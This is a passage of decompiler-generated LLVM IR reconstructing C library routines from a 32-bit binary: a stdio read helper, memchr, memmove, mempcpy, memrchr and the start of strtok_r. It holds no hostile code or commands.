  %v2_8055d0f = add i32 %v4_8055d08, 24
  %v3_8055d0f = inttoptr i32 %v2_8055d0f to i32*
  %v4_8055d0f = load i32, i32* %v3_8055d0f, align 4
  %v10_8055d0f = icmp ult i32 %v3_8055d0c, %v4_8055d0f
  br i1 %v10_8055d0f, label %dec_label_pc_8055db1, label %dec_label_pc_8055d18

dec_label_pc_8055d18:                             ; preds = %entry
  %v2_8055d18 = load i16, i16* %tmp, align 2
  %v3_8055d18 = zext i16 %v2_8055d18 to i32
  %v1_8055d1b = and i32 %v3_8055d18, 131
  %v6_8055d25 = icmp ugt i32 %v1_8055d1b, 128
  br i1 %v6_8055d25, label %dec_label_pc_8055d3f, label %dec_label_pc_8055d27

dec_label_pc_8055d27:                             ; preds = %dec_label_pc_8055d18
  %v0_8055d27 = load i32, i32* @edx, align 4
  %v6_8055d2f = call i32 @__stdio_trans2r_o(i16* nonnull %tmp, i32 128, i32 %v0_8055d27, i32 %v0_8055d27)
  %v1_8055d37 = icmp eq i32 %v6_8055d2f, 0
  %v1_8055d39 = icmp eq i1 %v1_8055d37, false
  br i1 %v1_8055d39, label %dec_label_pc_8055dd6, label %dec_label_pc_8055d27.dec_label_pc_8055d3f_crit_edge

dec_label_pc_8055d27.dec_label_pc_8055d3f_crit_edge: ; preds = %dec_label_pc_8055d27
  %v0_8055d3f.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8055d3f

dec_label_pc_8055d3f:                             ; preds = %dec_label_pc_8055d27.dec_label_pc_8055d3f_crit_edge, %dec_label_pc_8055d18
  %v2_8055d73 = phi i32 [ %v0_8055d3f.pre, %dec_label_pc_8055d27.dec_label_pc_8055d3f_crit_edge ], [ %v4_8055d08, %dec_label_pc_8055d18 ]
  %v1_8055d3f = inttoptr i32 %v2_8055d73 to i16*
  %v2_8055d3f = load i16, i16* %v1_8055d3f, align 2
  %v3_8055d3f = zext i16 %v2_8055d3f to i32
  store i32 %v3_8055d3f, i32* @ecx, align 4
  %v2_8055d42 = and i16 %v2_8055d3f, 2
  %v3_8055d42 = icmp eq i16 %v2_8055d42, 0
  br i1 %v3_8055d42, label %dec_label_pc_8055d62, label %dec_label_pc_8055d47

dec_label_pc_8055d47:                             ; preds = %dec_label_pc_8055d3f
  %tmp20 = urem i16 %v2_8055d3f, 2
  %v1_8055d49 = zext i16 %tmp20 to i32
  %tmp19 = sub nsw i32 0, %v1_8055d49
  %v2_8055d4c = and i32 %tmp19, 4
  %v3_8055d4c = add i32 %v2_8055d73, 36
  %v4_8055d4c = add i32 %v3_8055d4c, %v2_8055d4c
  %v5_8055d4c = inttoptr i32 %v4_8055d4c to i8*
  %v6_8055d4c = load i8, i8* %v5_8055d4c, align 1
  %v7_8055d4c = zext i8 %v6_8055d4c to i32
  %v8_8055d4c = load i32, i32* @edx, align 4
  %v9_8055d4c = and i32 %v8_8055d4c, -256
  %v10_8055d4c = or i32 %v9_8055d4c, %v7_8055d4c
  store i32 %v10_8055d4c, i32* %edx.global-to-local, align 4
  %v1_8055d50 = add i16 %v2_8055d3f, -1
  store i16 %v1_8055d50, i16* %v1_8055d3f, align 2
  %v0_8055d56 = load i32, i32* @ebx, align 4
  %v1_8055d56 = add i32 %v0_8055d56, 40
  %v2_8055d56 = inttoptr i32 %v1_8055d56 to i32*
  store i32 0, i32* %v2_8055d56, align 4
  %v0_8055d5d = load i32, i32* %edx.global-to-local, align 4
  %v1_8055d5d = urem i32 %v0_8055d5d, 256
  store i32 %v1_8055d5d, i32* @edx, align 4
  br label %dec_label_pc_8055dd9

dec_label_pc_8055d62:                             ; preds = %dec_label_pc_8055d3f
  %v1_8055d62 = add i32 %v2_8055d73, 16
  %v2_8055d62 = inttoptr i32 %v1_8055d62 to i32*
  %v3_8055d62 = load i32, i32* %v2_8055d62, align 4
  store i32 %v3_8055d62, i32* @eax, align 4
  %v1_8055d65 = add i32 %v2_8055d73, 20
  %v2_8055d65 = inttoptr i32 %v1_8055d65 to i32*
  %v3_8055d65 = load i32, i32* %v2_8055d65, align 4
  %v15_8055d65 = icmp eq i32 %v3_8055d65, %v3_8055d62
  %v1_8055d68 = icmp eq i1 %v15_8055d65, false
  br i1 %v1_8055d68, label %dec_label_pc_8055db1, label %dec_label_pc_8055d6a

dec_label_pc_8055d6a:                             ; preds = %dec_label_pc_8055d62
  %v1_8055d6a = add i32 %v2_8055d73, 4
  %v2_8055d6a = inttoptr i32 %v1_8055d6a to i32*
  %v3_8055d6a = load i32, i32* %v2_8055d6a, align 4
  %v13_8055d6a = icmp eq i32 %v3_8055d6a, -2
  %v1_8055d6e = icmp eq i1 %v13_8055d6a, false
  br i1 %v1_8055d6e, label %dec_label_pc_8055d78, label %dec_label_pc_8055d70

dec_label_pc_8055d70:                             ; preds = %dec_label_pc_8055d6a
  %v1_8055d70 = or i32 %v3_8055d3f, 4
  store i32 %v1_8055d70, i32* @ecx, align 4
  %v1_8055d73 = trunc i32 %v1_8055d70 to i16
  store i16 %v1_8055d73, i16* %v1_8055d3f, align 2
  br label %dec_label_pc_8055dd6

dec_label_pc_8055d78:                             ; preds = %dec_label_pc_8055d6a
  %v3_8055d78 = and i16 %v2_8055d3f, 768
  %v4_8055d78 = icmp eq i16 %v3_8055d78, 0
  br i1 %v4_8055d78, label %dec_label_pc_8055d8d, label %dec_label_pc_8055d7d

dec_label_pc_8055d7d:                             ; preds = %dec_label_pc_8055d78
  %v3_8055d85 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_805b2b8.469 to i16*))
  %v0_8055d8d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8055d8d

dec_label_pc_8055d8d:                             ; preds = %dec_label_pc_8055d78, %dec_label_pc_8055d7d
  %v0_8055dc2 = phi i32 [ %v2_8055d73, %dec_label_pc_8055d78 ], [ %v0_8055d8d.pre, %dec_label_pc_8055d7d ]
  %v1_8055d8d = add i32 %v0_8055dc2, 8
  %v2_8055d8d = inttoptr i32 %v1_8055d8d to i32*
  %v3_8055d8d = load i32, i32* %v2_8055d8d, align 4
  %v1_8055d90 = add i32 %v0_8055dc2, 12
  %v2_8055d90 = inttoptr i32 %v1_8055d90 to i32*
  %v3_8055d90 = load i32, i32* %v2_8055d90, align 4
  %v15_8055d90 = icmp eq i32 %v3_8055d90, %v3_8055d8d
  br i1 %v15_8055d90, label %dec_label_pc_8055dba, label %dec_label_pc_8055d95

dec_label_pc_8055d95:                             ; preds = %dec_label_pc_8055d8d
  %v2_8055d98 = add i32 %v0_8055dc2, 24
  %v3_8055d98 = inttoptr i32 %v2_8055d98 to i32*
  store i32 %v3_8055d8d, i32* %v3_8055d98, align 4
  %v0_8055d9b = load i32, i32* @ebx, align 4
  %v2_8055d9c = call i32 @__stdio_rfill(i32 %v0_8055d9b)
  %v1_8055da4 = icmp eq i32 %v2_8055d9c, 0
  br i1 %v1_8055da4, label %dec_label_pc_8055dd6, label %dec_label_pc_8055da8

dec_label_pc_8055da8:                             ; preds = %dec_label_pc_8055d95
  %v0_8055da8 = load i32, i32* @ebx, align 4
  %v1_8055da8 = add i32 %v0_8055da8, 20
  %v2_8055da8 = inttoptr i32 %v1_8055da8 to i32*
  %v3_8055da8 = load i32, i32* %v2_8055da8, align 4
  %v2_8055dab = add i32 %v0_8055da8, 24
  %v3_8055dab = inttoptr i32 %v2_8055dab to i32*
  store i32 %v3_8055da8, i32* %v3_8055dab, align 4
  %v0_8055dae = load i32, i32* @ebx, align 4
  %v1_8055dae = add i32 %v0_8055dae, 16
  %v2_8055dae = inttoptr i32 %v1_8055dae to i32*
  %v3_8055dae = load i32, i32* %v2_8055dae, align 4
  br label %dec_label_pc_8055db1

dec_label_pc_8055db1:                             ; preds = %dec_label_pc_8055d62, %entry, %dec_label_pc_8055da8
  %v1_8055db5 = phi i32 [ %v2_8055d73, %dec_label_pc_8055d62 ], [ %v4_8055d08, %entry ], [ %v0_8055dae, %dec_label_pc_8055da8 ]
  %v0_8055db1 = phi i32 [ %v3_8055d62, %dec_label_pc_8055d62 ], [ %v3_8055d0c, %entry ], [ %v3_8055dae, %dec_label_pc_8055da8 ]
  %v1_8055db1 = inttoptr i32 %v0_8055db1 to i8*
  %v2_8055db1 = load i8, i8* %v1_8055db1, align 1
  %v3_8055db1 = zext i8 %v2_8055db1 to i32
  store i32 %v3_8055db1, i32* @edx, align 4
  %v1_8055db4 = add i32 %v0_8055db1, 1
  %v2_8055db5 = add i32 %v1_8055db5, 16
  %v3_8055db5 = inttoptr i32 %v2_8055db5 to i32*
  store i32 %v1_8055db4, i32* %v3_8055db5, align 4
  %v0_8055ddc.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8055dd9

dec_label_pc_8055dba:                             ; preds = %dec_label_pc_8055d8d
  %v2_8055dbd = ptrtoint i8* %stack_var_-5 to i32
  %v5_8055dc2 = inttoptr i32 %v0_8055dc2 to i16*
  %v5_8055dc3 = call i32 @__stdio_READ(i16* %v5_8055dc2, i32 %v2_8055dbd, i32 1)
  %v1_8055dcb = icmp eq i32 %v5_8055dc3, 0
  br i1 %v1_8055dcb, label %dec_label_pc_8055dd6, label %dec_label_pc_8055dcf

dec_label_pc_8055dcf:                             ; preds = %dec_label_pc_8055dba
  %v3_8055dcf = load i8, i8* %stack_var_-5, align 1
  %v4_8055dcf = sext i8 %v3_8055dcf to i32
  store i32 %v4_8055dcf, i32* @edx, align 4
  br label %dec_label_pc_8055dd9

dec_label_pc_8055dd6:                             ; preds = %dec_label_pc_8055dba, %dec_label_pc_8055d95, %dec_label_pc_8055d27, %dec_label_pc_8055d70
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_8055dd9

dec_label_pc_8055dd9:                             ; preds = %dec_label_pc_8055dcf, %dec_label_pc_8055db1, %dec_label_pc_8055d47, %dec_label_pc_8055dd6
  %v0_8055ddc = phi i32 [ %v4_8055dcf, %dec_label_pc_8055dcf ], [ %v0_8055ddc.pre, %dec_label_pc_8055db1 ], [ %v1_8055d5d, %dec_label_pc_8055d47 ], [ -1, %dec_label_pc_8055dd6 ]
  store i32 %v0_8055d04, i32* @ebx, align 4
  ret i32 %v0_8055ddc

; uselistorder directives
  uselistorder i32 %v0_8055db1, { 1, 0 }
  uselistorder i32 %v3_8055d8d, { 1, 0 }
  uselistorder i32 %v0_8055dc2, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8055d62, { 1, 0, 2 }
  uselistorder i32 %v1_8055d5d, { 1, 0 }
  uselistorder i16 %v2_8055d3f, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_8055d73, { 1, 2, 3, 5, 4, 0, 6 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i32 (i16*)* @fflush_unlocked, { 1, 0 }
  uselistorder i16* @global_var_805b300.460, { 2, 1, 0 }
  uselistorder i32 131, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055dd9, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8055dd6, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8055db1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055d8d, { 1, 0 }
}

define i32 @__GI_memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_8055de0 = load i32, i32* @edi, align 4
  store i32 %v0_8055de0, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_8055de7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8055de7, i32* %edi.global-to-local, align 4
  %v1_8055def = icmp eq i32 %arg3, 0
  store i1 %v1_8055def, i1* %zf.global-to-local, align 1
  br i1 %v1_8055def, label %dec_label_pc_8055dff, label %dec_label_pc_8055df3

dec_label_pc_8055df3:                             ; preds = %entry
  %v2_8055df3 = call i32 @_strlen(i8* %arg1)
  %v3_8055df3 = mul i32 %v2_8055df3, -1
  %v4_8055df3 = add i32 %v3_8055df3, -2
  store i32 %v4_8055df3, i32* @ecx, align 4
  %v0_8055df5 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8055df5, label %dec_label_pc_8055df3.dec_label_pc_8055dfc_crit_edge, label %dec_label_pc_8055df7

dec_label_pc_8055df3.dec_label_pc_8055dfc_crit_edge: ; preds = %dec_label_pc_8055df3
  %v0_8055dfc.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_8055dfc.pre, -1
  br label %dec_label_pc_8055dfc

dec_label_pc_8055df7:                             ; preds = %dec_label_pc_8055df3
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8055dfc

dec_label_pc_8055dfc:                             ; preds = %dec_label_pc_8055df3.dec_label_pc_8055dfc_crit_edge, %dec_label_pc_8055df7
  %v0_8055dfc = phi i32 [ %phitmp, %dec_label_pc_8055df3.dec_label_pc_8055dfc_crit_edge ], [ 0, %dec_label_pc_8055df7 ]
  %v8_8055dfc = icmp eq i32 %v0_8055dfc, 0
  store i1 %v8_8055dfc, i1* %zf.global-to-local, align 1
  store i32 %v0_8055dfc, i32* %edi.global-to-local, align 4
  %v2_8055dff.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8055dff

dec_label_pc_8055dff:                             ; preds = %entry, %dec_label_pc_8055dfc
  %v0_8055e00 = phi i32 [ 0, %entry ], [ %v0_8055dfc, %dec_label_pc_8055dfc ]
  %v2_8055dff = phi i32 [ %v0_8055de0, %entry ], [ %v2_8055dff.pre, %dec_label_pc_8055dfc ]
  store i32 %v2_8055dff, i32* @edi, align 4
  ret i32 %v0_8055e00

; uselistorder directives
  uselistorder i32 %v0_8055dfc, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8055dff, { 1, 0 }
  uselistorder label %dec_label_pc_8055dfc, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8055e05 = load i32, i32* @esi, align 4
  store i32 %v0_8055e05, i32* %stack_var_-8, align 4
  %v4_8055e06 = ptrtoint i8* %arg1 to i32
  %v9_8055e12 = icmp ugt i8* %tmp3, %arg1
  %v1_8055e14 = icmp eq i1 %v9_8055e12, false
  br i1 %v1_8055e14, label %dec_label_pc_8055e1c, label %dec_label_pc_8055e16

dec_label_pc_8055e16:                             ; preds = %entry
  %v7_8055e18 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %tmp)
  br label %dec_label_pc_8055e28

dec_label_pc_8055e1c:                             ; preds = %entry
  %v3_8055e1c = add i32 %arg2, -1
  %v4_8055e1c = add i32 %v3_8055e1c, %tmp
  %v5_8055e1c = inttoptr i32 %v4_8055e1c to i8*
  %v3_8055e20 = add i32 %v4_8055e06, -1
  %v4_8055e20 = add i32 %v3_8055e20, %tmp
  %v5_8055e20 = inttoptr i32 %v4_8055e20 to i8*
  %v7_8055e25 = call i8* @_memcpy(i8* %v5_8055e20, i8* %v5_8055e1c, i32 %tmp)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_8055e28

dec_label_pc_8055e28:                             ; preds = %dec_label_pc_8055e16, %dec_label_pc_8055e1c
  %v2_8055e28 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8055e28, i32* @esi, align 4
  ret i32 %v4_8055e06

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %tmp, { 1, 3, 2, 0 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055e28, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8055e2c = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_8055e3f = inttoptr i32 %arg1 to i16*
  %v4_8055e3f = call i32 @memcpy(i16* %v3_8055e3f, i32 %arg2, i32 %arg3)
  %v0_8055e47 = load i32, i32* @esi, align 4
  %v2_8055e47 = add i32 %v0_8055e47, %arg3
  store i32 %v0_8055e2c, i32* @esi, align 4
  ret i32 %v2_8055e47
}

define i32 @memrchr(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %v4_8055e55 = urem i32 %arg2, 256
  %v4_8055e61 = sext i8 %arg1 to i32
  %v2_8055e65 = add i32 %v4_8055e61, %arg3
  %v1_8055e777 = icmp eq i32 %arg3, 0
  br i1 %v1_8055e777, label %dec_label_pc_8055e7f, label %dec_label_pc_8055e7b

dec_label_pc_8055e69:                             ; preds = %dec_label_pc_8055e7b
  %v1_8055e69 = add i32 %v0_8055e69, -1
  %v5_8055e6a = load i32, i32* @edx, align 4
  %v6_8055e6a = and i32 %v5_8055e6a, -256
  %v7_8055e6a = or i32 %v6_8055e6a, %v4_8055e55
  store i32 %v7_8055e6a, i32* @edx, align 4
  %v1_8055e6e = inttoptr i32 %v1_8055e69 to i8*
  %v2_8055e6e = load i8, i8* %v1_8055e6e, align 1
  %v15_8055e6e = icmp eq i8 %v2_8055e6e, %tmp
  br i1 %v15_8055e6e, label %dec_label_pc_8055efc, label %dec_label_pc_8055e76

dec_label_pc_8055e76:                             ; preds = %dec_label_pc_8055e69
  %v1_8055e76 = add i32 %v0_8055e76, -1
  %v8_8055e76 = icmp eq i32 %v1_8055e76, 0
  br i1 %v8_8055e76, label %dec_label_pc_8055e7f, label %dec_label_pc_8055e7b

dec_label_pc_8055e7b:                             ; preds = %entry, %dec_label_pc_8055e76
  %v0_8055e76 = phi i32 [ %v1_8055e76, %dec_label_pc_8055e76 ], [ %arg3, %entry ]
  %v0_8055e69 = phi i32 [ %v1_8055e69, %dec_label_pc_8055e76 ], [ %v2_8055e65, %entry ]
  %v2_8055e7b = urem i32 %v0_8055e69, 4
  %v3_8055e7b = icmp eq i32 %v2_8055e7b, 0
  %v1_8055e7d = icmp eq i1 %v3_8055e7b, false
  br i1 %v1_8055e7d, label %dec_label_pc_8055e69, label %dec_label_pc_8055e7f

dec_label_pc_8055e7f:                             ; preds = %dec_label_pc_8055e76, %dec_label_pc_8055e7b, %entry
  %v0_8055ee2.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_8055e76 ], [ %v0_8055e76, %dec_label_pc_8055e7b ]
  %v0_8055e84 = phi i32 [ %v2_8055e65, %entry ], [ %v1_8055e69, %dec_label_pc_8055e76 ], [ %v0_8055e69, %dec_label_pc_8055e7b ]
  store i32 %v0_8055e84, i32* @ecx, align 4
  %v2_8055e88 = mul nuw nsw i32 %v4_8055e55, 256
  %v2_8055e8b = or i32 %v2_8055e88, %v4_8055e55
  %v2_8055e8f = mul i32 %v2_8055e8b, 65536
  %v2_8055e92 = or i32 %v2_8055e8f, %v2_8055e8b
  %v6_8055ee555 = icmp ugt i32 %v0_8055ee2.pr, 3
  br i1 %v6_8055ee555, label %dec_label_pc_8055e96, label %dec_label_pc_8055ee7

dec_label_pc_8055e96:                             ; preds = %dec_label_pc_8055e7f, %dec_label_pc_8055edf
  %v0_8055edf57 = phi i32 [ %v1_8055edf, %dec_label_pc_8055edf ], [ %v0_8055ee2.pr, %dec_label_pc_8055e7f ]
  %v0_8055e9656 = phi i32 [ %v1_8055e96, %dec_label_pc_8055edf ], [ %v0_8055e84, %dec_label_pc_8055e7f ]
  %v1_8055e96 = add i32 %v0_8055e9656, -4
  store i32 %v1_8055e96, i32* @ecx, align 4
  %v2_8055e9b = inttoptr i32 %v1_8055e96 to i32*
  %v3_8055e9b = load i32, i32* %v2_8055e9b, align 4
  %v4_8055e9b = xor i32 %v3_8055e9b, %v2_8055e92
  %v1_8055e9d = add i32 %v4_8055e9b, 2130640639
  %v1_8055ea3 = sub i32 -1, %v4_8055e9b
  %v2_8055ea5 = xor i32 %v1_8055e9d, %v1_8055ea3
  %v1_8055ea7 = and i32 %v2_8055ea5, -2130640640
  %v2_8055ea7 = icmp eq i32 %v1_8055ea7, 0
  br i1 %v2_8055ea7, label %dec_label_pc_8055edf, label %dec_label_pc_8055eaf

dec_label_pc_8055eaf:                             ; preds = %dec_label_pc_8055e96
  %v7_8055eaf = or i32 %v1_8055ea7, %v4_8055e55
  %v1_8055eb3 = add i32 %v0_8055e9656, -1
  %v2_8055eb6 = inttoptr i32 %v1_8055eb3 to i8*
  %v3_8055eb6 = load i8, i8* %v2_8055eb6, align 1
  %v16_8055eb6 = icmp eq i8 %v3_8055eb6, %tmp
  br i1 %v16_8055eb6, label %dec_label_pc_8055efc, label %dec_label_pc_8055ebb

dec_label_pc_8055ebb:                             ; preds = %dec_label_pc_8055eaf
  %v1_8055ebf = add i32 %v0_8055e9656, -2
  %v2_8055ec2 = inttoptr i32 %v1_8055ebf to i8*
  %v3_8055ec2 = load i8, i8* %v2_8055ec2, align 1
  %v16_8055ec2 = icmp eq i8 %v3_8055ec2, %tmp
  br i1 %v16_8055ec2, label %dec_label_pc_8055efc, label %dec_label_pc_8055ec7

dec_label_pc_8055ec7:                             ; preds = %dec_label_pc_8055ebb
  %v1_8055ecb = add i32 %v0_8055e9656, -3
  %v2_8055ece = inttoptr i32 %v1_8055ecb to i8*
  %v3_8055ece = load i8, i8* %v2_8055ece, align 1
  %v16_8055ece = icmp eq i8 %v3_8055ece, %tmp
  br i1 %v16_8055ece, label %dec_label_pc_8055efc, label %dec_label_pc_8055ed3

dec_label_pc_8055ed3:                             ; preds = %dec_label_pc_8055ec7
  %v1_8055ed7 = inttoptr i32 %v1_8055e96 to i8*
  %v2_8055ed7 = load i8, i8* %v1_8055ed7, align 1
  %v15_8055ed7 = icmp eq i8 %v2_8055ed7, %tmp
  %v1_8055ed9 = icmp eq i1 %v15_8055ed7, false
  br i1 %v1_8055ed9, label %dec_label_pc_8055edf, label %dec_label_pc_8055edb

dec_label_pc_8055edb:                             ; preds = %dec_label_pc_8055ed3
  br label %dec_label_pc_8055efc

dec_label_pc_8055edf:                             ; preds = %dec_label_pc_8055ed3, %dec_label_pc_8055e96
  %v5_8055eec27 = phi i32 [ %v7_8055eaf, %dec_label_pc_8055ed3 ], [ 0, %dec_label_pc_8055e96 ]
  %v1_8055edf = add i32 %v0_8055edf57, -4
  %v6_8055ee5 = icmp ugt i32 %v1_8055edf, 3
  br i1 %v6_8055ee5, label %dec_label_pc_8055e96, label %dec_label_pc_8055ee7

dec_label_pc_8055ee7:                             ; preds = %dec_label_pc_8055edf, %dec_label_pc_8055e7f
  %v5_8055eec26.lcssa = phi i32 [ %v4_8055e55, %dec_label_pc_8055e7f ], [ %v5_8055eec27, %dec_label_pc_8055edf ]
  %v0_8055e96.lcssa = phi i32 [ %v0_8055e84, %dec_label_pc_8055e7f ], [ %v1_8055e96, %dec_label_pc_8055edf ]
  %v0_8055edf.lcssa = phi i32 [ %v0_8055ee2.pr, %dec_label_pc_8055e7f ], [ %v1_8055edf, %dec_label_pc_8055edf ]
  br label %dec_label_pc_8055ef4

dec_label_pc_8055eeb:                             ; preds = %dec_label_pc_8055ef4
  %v1_8055ef4 = add i32 %v0_8055ef4, -1
  %v1_8055eeb = add i32 %v0_8055eeb, -1
  %v6_8055eec = and i32 %v5_8055eec, -256
  %v7_8055eec = or i32 %v6_8055eec, %v4_8055e55
  %v1_8055ef0 = inttoptr i32 %v1_8055eeb to i8*
  %v2_8055ef0 = load i8, i8* %v1_8055ef0, align 1
  %v15_8055ef0 = icmp eq i8 %v2_8055ef0, %tmp
  br i1 %v15_8055ef0, label %dec_label_pc_8055efc, label %dec_label_pc_8055ef4

dec_label_pc_8055ef4:                             ; preds = %dec_label_pc_8055eeb, %dec_label_pc_8055ee7
  %v5_8055eec = phi i32 [ %v7_8055eec, %dec_label_pc_8055eeb ], [ %v5_8055eec26.lcssa, %dec_label_pc_8055ee7 ]
  %v0_8055eeb = phi i32 [ %v1_8055eeb, %dec_label_pc_8055eeb ], [ %v0_8055e96.lcssa, %dec_label_pc_8055ee7 ]
  %v0_8055ef4 = phi i32 [ %v1_8055ef4, %dec_label_pc_8055eeb ], [ %v0_8055edf.lcssa, %dec_label_pc_8055ee7 ]
  %v10_8055ef5 = icmp eq i32 %v0_8055ef4, 0
  %v1_8055ef8 = icmp eq i1 %v10_8055ef5, false
  br i1 %v1_8055ef8, label %dec_label_pc_8055eeb, label %dec_label_pc_8055efa

dec_label_pc_8055efa:                             ; preds = %dec_label_pc_8055ef4
  br label %dec_label_pc_8055efc

dec_label_pc_8055efc:                             ; preds = %dec_label_pc_8055e69, %dec_label_pc_8055ec7, %dec_label_pc_8055ebb, %dec_label_pc_8055eaf, %dec_label_pc_8055eeb, %dec_label_pc_8055edb, %dec_label_pc_8055efa
  %v0_8055eff = phi i32 [ %v1_8055e96, %dec_label_pc_8055edb ], [ 0, %dec_label_pc_8055efa ], [ %v1_8055eeb, %dec_label_pc_8055eeb ], [ %v1_8055ecb, %dec_label_pc_8055ec7 ], [ %v1_8055ebf, %dec_label_pc_8055ebb ], [ %v1_8055eb3, %dec_label_pc_8055eaf ], [ %v1_8055e69, %dec_label_pc_8055e69 ]
  ret i32 %v0_8055eff

; uselistorder directives
  uselistorder i32 %v0_8055ef4, { 1, 0 }
  uselistorder i32 %v1_8055edf, { 0, 2, 1 }
  uselistorder i32 %v1_8055e96, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_8055e9656, { 3, 2, 1, 0 }
  uselistorder i32 %v2_8055e8b, { 1, 0 }
  uselistorder i32 %v0_8055e69, { 1, 0, 2 }
  uselistorder i32 %v2_8055e65, { 1, 0 }
  uselistorder i32 %v4_8055e55, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 -2, { 2, 6, 0, 15, 16, 1, 14, 18, 13, 19, 3, 5, 4, 20, 7, 8, 9, 17, 10, 11, 12 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8055efc, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8055e96, { 1, 0 }
  uselistorder label %dec_label_pc_8055e7f, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055e7b, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8055f00 = load i32, i32* @edi, align 4
  %v0_8055f01 = load i32, i32* @esi, align 4
  %v0_8055f02 = load i32, i32* @ebx, align 4
  store i32 %v0_8055f02, i32* %stack_var_-12, align 4
  %v4_8055f03 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8055f03, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8055f0f = icmp eq i8* %arg1, null
  %v1_8055f11 = icmp eq i1 %v1_8055f0f, false
  br i1 %v1_8055f11, label %dec_label_pc_8055f15, label %dec_label_pc_8055f13

dec_label_pc_8055f13:                             ; preds = %entry
  %v1_8055f13 = inttoptr i32 %arg3 to i32*
  %v2_8055f13 = load i32, i32* %v1_8055f13, align 4
  store i32 %v2_8055f13, i32* @ebx, align 4
  br label %dec_label_pc_8055f15

dec_label_pc_8055f15:                             ; preds = %entry, %dec_label_pc_8055f13
  %v0_8055f18 = phi i32 [ %v4_8055f03, %entry ], [ %v2_8055f13, %dec_label_pc_8055f13 ]
  %v0_8055f15 = load i32, i32* @ecx, align 4
  %v5_8055f18 = inttoptr i32 %v0_8055f18 to i8*
  %v8_8055f19 = call i32 @__GI_strspn(i8* %v5_8055f18, i32 %arg2, i32 %v0_8055f15, i32 %v0_8055f15)
  store i32 %v8_8055f19, i32* %eax.global-to-local, align 4
  %v0_8055f21 = load i32, i32* @ebx, align 4
  %v2_8055f21 = add i32 %v0_8055f21, %v8_8055f19
  store i32 %v2_8055f21, i32* @ebx, align 4
  %v1_8055f23 = inttoptr i32 %v2_8055f21 to i8*
  %v2_8055f23 = load i8, i8* %v1_8055f23, align 1
  %v3_8055f23 = icmp eq i8 %v2_8055f23, 0
  %v1_8055f26 = icmp eq i1 %v3_8055f23, false
  br i1 %v1_8055f26, label %dec_label_pc_8055f2e, label %dec_label_pc_8055f28

dec_label_pc_8055f28:                             ; preds = %dec_label_pc_8055f15
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8055f2a = load i32, i32* @esi, align 4
  %v2_8055f2a = inttoptr i32 %v1_8055f2a to i32*
  store i32 %v2_8055f21, i32* %v2_8055f2a, align 4
  %v0_8055f58.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055f55

dec_label_pc_8055f2e:                             ; preds = %dec_label_pc_8055f15
  %v0_8055f2e = load i32, i32* @edx, align 4
  %v0_8055f30 = load i32, i32* @edi, align 4
  %v8_8055f32 = call i32 @__GI_strpbrk(i8* %v1_8055f23, i32 %v0_8055f30, i32 %v0_8055f2e, i32 %v0_8055f2e)
  store i32 %v8_8055f32, i32* %eax.global-to-local, align 4
  %v2_8055f3a = icmp eq i32 %v8_8055f32, 0
  %v1_8055f3c = icmp eq i1 %v2_8055f3a, false
  br i1 %v1_8055f3c, label %dec_label_pc_8055f4d, label %dec_label_pc_8055f3e

dec_label_pc_8055f3e:                             ; preds = %dec_label_pc_8055f2e
  %v0_8055f42 = load i32, i32* @ebx, align 4
  %v5_8055f42 = inttoptr i32 %v0_8055f42 to i8*
  %v8_8055f43 = call i32 @rawmemchr(i8* %v5_8055f42, i32 0, i32 %v8_8055f32, i32 %v8_8055f32)
